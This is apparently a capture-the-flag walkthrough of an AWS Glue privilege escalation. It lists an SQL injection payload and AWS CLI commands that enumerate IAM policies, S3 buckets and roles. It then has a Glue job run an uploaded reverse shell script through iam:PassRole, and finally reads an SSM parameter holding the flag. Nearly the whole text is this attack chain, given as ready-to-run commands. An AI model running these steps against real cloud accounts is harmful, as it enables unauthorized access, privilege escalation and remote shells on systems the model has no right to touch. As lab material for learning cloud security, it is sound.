1. Sql Injection attack using burp suite

`' 1=1-- -`

2. Check glue administrator information

`aws configure --profile [glue_manager]`

3. Username Verification

`aws --profile [glue_manager] sts get-caller-identity`

4. Check inline policies

`aws --profile [glue_manager] iam list-user-policies --user-name [glue_username]`

5. Read more about inline policies

`aws --profile [glue_manager] iam get-user-policy --user-name [glue_username] --policy-name [inline_policy_name]`

6. Check the bucket granted to the privilege

`aws --profile [glue_manager] s3 ls s3://[bucket_name]`

7. Listing roles for using iam:passrole

`aws --profile [glue_manager] iam list-roles`

8. Inquiry permissions for roles

`aws --profile [glue_manager] iam list-attached-role-policies --role-name [role_name]`

9. Uploading reverse shell code(rev.py) created on the webpage

10. Create a glue job that executes reverse shell code

`aws --profile [glue_manager] glue create-job --name [job_name] --role [role_arn] --command '{"Name":"pythonshell", "PythonVersion": "3", "ScriptLocation":"s3://[bucket_name]/[reverse_shell_code_file]"}'`

11. Run a job

`aws --profile [glue_manager] glue start-job-run --job-name [job_name]`

12. Accessing SSM parameters

`aws ssm get-parameter --name flag`
